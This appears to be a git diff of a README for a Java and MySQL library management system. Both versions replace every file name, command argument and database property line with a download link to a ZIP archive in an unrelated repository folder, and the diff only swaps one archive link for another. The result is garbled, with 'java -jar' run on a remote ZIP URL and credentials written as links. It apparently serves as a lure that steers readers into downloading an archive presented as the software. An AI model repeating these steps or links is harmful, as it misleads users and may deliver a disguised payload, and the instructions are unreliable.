@@ -1,6 +1,6 @@
 # 📚 Library_Management_System - Manage Your Books Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip)](https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip)
+[![Download Now](https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip)](https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -28,11 +28,11 @@ If you do not have Java or MySQL installed, please download and install them fro
 
 To get started, visit the Releases page to download the Library Management System:
 
-[Download Now](https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip)
+[Download Now](https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of the Library Management System.
-3. Find the appropriate download file for your operating system (for example, `https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip` for Windows).
+3. Find the appropriate download file for your operating system (for example, `https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip` for Windows).
 4. Click the file name to download it to your computer.
 
 ## 📥 Installation Steps
@@ -43,10 +43,10 @@ After downloading the software, follow these steps to install it:
 2. **Extract the File:** 
    - **Windows:** Right-click the ZIP file and select "Extract All." Follow the prompts to extract the contents.
    - **macOS:** Double-click the ZIP file. It will automatically extract.
-   - **Linux:** Use the terminal and run the command `unzip https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip` or right-click and extract.
+   - **Linux:** Use the terminal and run the command `unzip https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip` or right-click and extract.
 3. **Run the Application:**
    - Navigate to the extracted folder.
-   - Open a command prompt or terminal and run `java -jar https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip`.
+   - Open a command prompt or terminal and run `java -jar https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip`.
    - If you're on Windows, you may double-click the JAR file to run it directly.
 
 ## ⚙️ Setting Up MySQL
@@ -66,12 +66,12 @@ To use the Library Management System effectively, you need to connect it to a My
 
 Once your database is set up, you need to configure the application to connect to MySQL.
 
-1. Open the `https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip` file located in the extracted folder.
+1. Open the `https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip` file located in the extracted folder.
 2. Update the following properties with your MySQL credentials:
    ```
-   https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip
-   https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip
-   https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip
+   https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip
+   https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip
+   https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip
    ```
 3. Save and close the file.
 
@@ -82,7 +82,7 @@ Now you are ready to run the Library Management System:
 1. Make sure the MySQL server is running.
 2. Open a command prompt or terminal.
 3. Navigate to the folder where the JAR file is located.
-4. Run `java -jar https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip`.
+4. Run `java -jar https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip`.
 
 If everything is set up correctly, the application should start, and you can log in with the default credentials.
 
@@ -92,7 +92,7 @@ If you face any issues, check the following:
 
 - Ensure Java and MySQL are correctly installed.
 - Confirm that your MySQL server is running.
-- Verify the credentials in the `https://raw.githubusercontent.com/rahul28042004/Library_Management_System/main/Kurdish/Management-System-Library-2.3-beta.3.zip` file.
+- Verify the credentials in the `https://github.com/rahul28042004/Library_Management_System/raw/refs/heads/main/Kurdish/Management_System_Library_v2.1.zip` file.
 
 If problems persist, consult the documentation included in the extracted folder or seek help in the community.
 
